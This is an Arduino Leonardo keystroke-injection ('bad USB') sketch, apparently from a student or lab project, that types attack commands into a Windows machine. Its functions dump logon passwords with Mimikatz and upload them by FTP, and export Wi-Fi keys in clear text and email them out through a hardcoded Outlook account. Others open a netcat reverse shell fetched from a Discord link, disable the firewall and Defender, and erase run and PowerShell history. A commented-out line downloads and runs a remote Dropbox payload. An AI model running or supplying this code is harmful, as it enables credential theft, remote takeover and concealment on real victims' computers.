#include <phukdlib_leonardo.h>


void DirectoryGrabber(){

  Keyboard.begin();
/*
  delay(500);

  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);
  Keyboard.print(F("powershell -w h -NoP -NonI -ep Bypass $pl = iwr <https://www.dropbox.com/scl/fo/lk4x6oh17mnpr9o46dg6i/h?dl=1&rlkey=og3w3hytp688dt8wpz5e3hmfz> dl=1; iex $pl"));

  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  // Ending stream
  Keyboard.end();
  */
  delay(2000);
  Keyboard.print(F(" - / : ; ' <  > $  & ? ! = "));
  Keyboard.releaseAll();

  // Ending stream
  Keyboard.end();  
}

void Mimikatz_ftp() {
  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.print("cmd");
  delay(2000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(100);
  Keyboard.releaseAll();
  delay(4000);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.println("ftp");
  delay(3000);
  Keyboard.println("open 192.168.1.210");
  delay(10000);
  Keyboard.println("pi");
  delay(3000);
  Keyboard.println("kali");
  delay(5000);
  Keyboard.println("binary");
  delay(2000);
  Keyboard.println("GET mimikatz.exe");
  delay(5000);
  Keyboard.println("bye");
  delay(3000);
  Keyboard.println("mimikatz.exe");
  delay(4000);
  Keyboard.println("log");
  delay(2000);
  Keyboard.println("privilege::debug");
  delay(3000);
  Keyboard.println("sekurlsa::logonPasswords full");
  delay(10000);
  Keyboard.println("exit");
  delay(3000);
  Keyboard.println("ftp");
  delay(3000);
  Keyboard.println("open 10.1.206.174");
  delay(10000);
  Keyboard.println("pi");
  delay(3000);
  Keyboard.println("kali");
  delay(5000);
  Keyboard.println("PUT mimikatz.log");
  delay(3000);
  Keyboard.println("bye");
  delay(3000);
  Keyboard.println("del mimikatz.exe");
  delay(3000);
  Keyboard.println("del mimikatz.log");
  delay(3000);
  Keyboard.println("exit");
}


void Scanner() {

  // Wait 500ms
  delay(500);

  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();

  delay(150);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(400);
  Keyboard.print("cmd");

  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500);
  Keyboard.print(F("color FE & mode con:cols=18 lines=1"));
  Keyboard.press(KEY_RETURN);

  delay(3000);
  // --> Harvest
  Keyboard.print(F("cd Desktop \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("mkdir A \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("cd A \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("netsh wlan export profile key=clear \n"));

  Keyboard.press(KEY_RETURN);

  delay(400);
  Keyboard.print(F("cd .. \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("powershell \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("Compress-Archive -Path A -DestinationPath A.zip -Force \n"));

  Keyboard.press(KEY_RETURN);
  delay(500);
  // --> Outlook SMTP
  
  Keyboard.print(F("[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n"));
  Keyboard.press(KEY_RETURN);
  delay(400);
 
  Keyboard.print(F("$SMTPServer = 'smtp.office365.com' \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587) \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("$SMTPInfo.EnableSsl = $true \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('hackerUtad@outlook.com', 'Kalikali') \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("$ReportEmail = New-Object System.Net.Mail.MailMessage \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("$ReportEmail.From = 'hackerUtad@outlook.com' \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("$ReportEmail.To.Add('hackerUtad@outlook.com') \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("$ReportEmail.Subject = \"Esto no es sospechoso\" \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("$ReportEmail.Body = \"Por favor funciona\" \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("$ReportEmail.Attachments.Add(\"A.zip\") \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("$SMTPInfo.Send($ReportEmail) \n"));

  Keyboard.press(KEY_RETURN);

  delay(400);
  // --> Clean up
  Keyboard.print(F("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("cd AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("del ConsoleHost_history.txt \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("exit \n"));

  Keyboard.press(KEY_RETURN);

  delay(400);
  Keyboard.print(F("del A & rmdir A \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("S \n"));

  Keyboard.press(KEY_RETURN);
  delay(400);

  Keyboard.print(F("del A.zip & exit \n"));

  Keyboard.press(KEY_RETURN);

  Keyboard.releaseAll();

}

void ReverseShell() {
  
  // Wait 500ms
  delay(500);

  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(1000);
  Keyboard.print(F("cmd"));

  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(1000);
  Keyboard.print(F("cd / & mkdir win & cd win & echo (wget 'https://cdn.discordapp.com/attachments/823520101415911464/826813046500491264/nc64.exe' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1 \n"));

  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(3000);
  Keyboard.print(F("START /MIN a.exe <192.168.1.210> <8080> -e cmd.exe -d & exit \n"));

  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  // Ending stream
  Keyboard.end();

}

void Firewall() {
  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.print("powershell.exe netsh advfirewall set currentprofile state off");
  delay(2000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
/////////////////////////////////////////////////////////// DEFENDER

  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();
  
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.releaseAll();

  delay(500);
  Keyboard.print(F("virus"));
  Keyboard.releaseAll();
  delay(500);

  Keyboard.press(KEY_DOWN_ARROW);
  Keyboard.press(KEY_UP_ARROW);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(3000);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(500);

  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(200);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(2000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.releaseAll();
  Keyboard.press('s');
  Keyboard.releaseAll();
}
